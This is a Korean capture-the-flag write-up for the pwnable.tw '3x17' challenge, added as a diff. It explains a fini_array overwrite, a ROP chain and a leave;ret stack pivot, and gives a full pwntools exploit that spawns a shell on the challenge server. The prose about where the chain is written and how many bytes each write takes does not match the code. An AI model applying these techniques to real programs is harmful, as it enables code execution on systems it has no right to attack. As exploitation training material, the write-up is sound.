@@ -1,0 +1,126 @@
+# pwnable.tw - 3x17
+
+**출처:** [pwnable.tw 3x17](https://pwnable.tw/challenge/#51)  
+**기법:** ROP, fini_array 덮어쓰기, Stack Pivot
+
+---
+
+## 문제 분석
+
+### 보호 기법
+
+| 보호 기법 | 적용 여부 | 의미 |
+|-----------|-----------|------|
+| PIE | ❌ | 함수 주소 고정 → 가젯 주소 그대로 사용 가능 |
+| Canary | ❌ | 스택 오버플로우 탐지 없음 |
+| NX | ✅ | 스택에 셸코드 직접 실행 불가 → ROP 필요 |
+| 링킹 방식 | Static | libc 없이 바이너리 내부 가젯만으로 ROP 구성 가능 |
+
+### 동작 분석
+
+- 임의 주소에 3바이트씩 데이터를 쓸 수 있는 단순한 구조
+- `start` 함수에서 `sub_401B6D`를 `main`으로 추정 (실행 시 "addr:" 출력 확인)
+- 입력은 `addr`과 `data`를 받아 해당 주소에 직접 씀
+
+---
+
+## 익스플로잇 전략
+
+NX가 걸려 있어 스택에 셸코드를 올릴 수 없으므로 ROP를 사용한다.
+
+핵심 아이디어는 **`fini_array` 덮어쓰기**다.  
+`fini_array`는 프로그램 종료 시 `exit()`가 호출되면서 실행되는 함수 포인터 배열이다.  
+여기에 ROP chain 시작 주소를 써두면, 프로그램이 종료될 때 자동으로 실행된다.
+
+단, 3바이트씩밖에 못 쓰기 때문에 ROP chain을 BSS 영역에 나눠서 작성하고,  
+Stack Pivot(`leave; ret`)으로 스택을 BSS로 옮겨 ROP chain을 실행한다.
+
+**전체 흐름:**
+```
+fini_array[0] = fini_array_call  # 종료 시 루프 유지
+fini_array[1] = main             # 쓰기 반복 가능하도록
+bss = "/bin/sh\x00"              # execve 인자 준비
+bss+0x10~ = ROP chain            # execve("/bin/sh", 0, 0) syscall
+fini_array[0] = leave_ret        # stack pivot → BSS로 이동
+fini_array[1] = ret              # 스택 정렬
+```
+
+---
+
+## 주요 주소
+
+```python
+main          = 0x401b6d
+fini_array    = 0x4b40f0
+fini_array_call = 0x402960
+bss           = 0x4b92e0
+
+# ROPgadget --binary ./3x17 으로 추출
+pop_rdi  = 0x401696
+pop_rsi  = 0x406c30
+pop_rdx  = 0x446e35
+pop_rax  = 0x41e4af
+pop_rbp  = 0x401b2d
+syscall  = 0x4022b4
+leave_ret = 0x401c4b
+```
+
+---
+
+## 익스플로잇 코드
+
+```python
+from pwn import *
+
+p = remote("chall.pwnable.tw", 10105)
+
+main          = 0x401b6d
+fini_array    = 0x4b40f0
+fini_array_call = 0x402960
+bss           = 0x4b92e0
+
+pop_rdi   = 0x401696
+pop_rsi   = 0x406c30
+pop_rdx   = 0x446e35
+pop_rax   = 0x41e4af
+pop_rbp   = 0x401b2d
+syscall   = 0x4022b4
+leave_ret = 0x401c4b
+
+# execve("/bin/sh", 0, 0) syscall을 위한 ROP chain
+ROP = [
+    p64(pop_rdi), p64(bss),    # rdi = "/bin/sh" 주소
+    p64(pop_rsi), p64(0),      # rsi = 0
+    p64(pop_rdx), p64(0),      # rdx = 0
+    p64(pop_rax), p64(0x3b),   # rax = 59 (execve syscall 번호)
+    p64(syscall)
+]
+
+def write(addr, data):
+    p.sendafter("addr:", str(addr).encode())
+    p.sendafter("data:", data)
+
+# 1. fini_array에 루프 설정 (프로그램 종료 시 main으로 돌아오게)
+write(fini_array, p64(fini_array_call) + p64(main))
+
+# 2. BSS에 "/bin/sh" 문자열 작성
+write(bss, b"/bin/sh\x00")
+
+# 3. BSS+0x10부터 ROP chain 작성 (3개씩 나눠서)
+for i in range(3):
+    write(fini_array + 0x10 + (i * 0x18),
+          ROP[3*i] + ROP[1 + 3*i] + ROP[2 + 3*i])
+
+# 4. Stack pivot: fini_array[0]을 leave_ret으로 덮어 BSS로 스택 이동
+write(fini_array, p64(leave_ret) + p64(pop_rdi + 1))  # +1은 ret (스택 정렬)
+
+p.interactive()  # 셸 획득
+```
+
+---
+
+## 배운 점
+
+- 제한된 쓰기 횟수를 우회하기 위해 `fini_array_call + main`으로 반복 실행 구조를 만드는 아이디어
+- Stack Pivot(`leave; ret`)을 적용하여 RBP 조작을 통해 스택 위치를 임의로 변경
+- 정적 링크 바이너리에서는 libc 없이도 바이너리 내부에 충분한 가젯이 존재
